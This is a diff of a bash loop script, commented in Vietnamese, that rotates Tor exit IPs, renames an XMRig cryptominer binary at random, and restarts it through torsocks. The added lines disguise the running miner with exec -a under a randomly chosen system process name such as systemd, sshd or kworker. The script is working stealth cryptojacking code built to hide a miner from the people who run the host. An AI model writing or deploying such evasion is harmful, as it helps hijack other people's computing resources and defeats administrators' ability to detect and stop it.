@@ -9,6 +9,12 @@ while true; do
   kill -HUP $(pgrep tor)
   echo "Tor đã thay đổi IP."
 
+  # Danh sách các tên tiến trình hợp lệ giống hệ thống
+  PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")
+
+  # Chọn một tên tiến trình ngẫu nhiên từ danh sách
+  RANDOM_PROCESS_NAME=${PROCESS_NAMES[$RANDOM % ${#PROCESS_NAMES[@]}]}
+
   # Đổi tên XMRig
   echo "Đổi tên XMRig..."
   if [ -f /root/xmrig_name.txt ]; then
@@ -21,5 +27,8 @@ while true; do
 
   # Cấp quyền chạy cho file mới
   chmod +x /root/work/$RANDOM_NAME
-  /root/start.sh  # Khởi động lại XMRig sau khi đổi IP và tên
+
+  # Khởi động lại XMRig với tên tiến trình hệ thống
+  echo "Khởi động lại XMRig với tên tiến trình: $RANDOM_PROCESS_NAME"
+  exec -a $RANDOM_PROCESS_NAME torsocks /root/work/$RANDOM_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:9050
 done
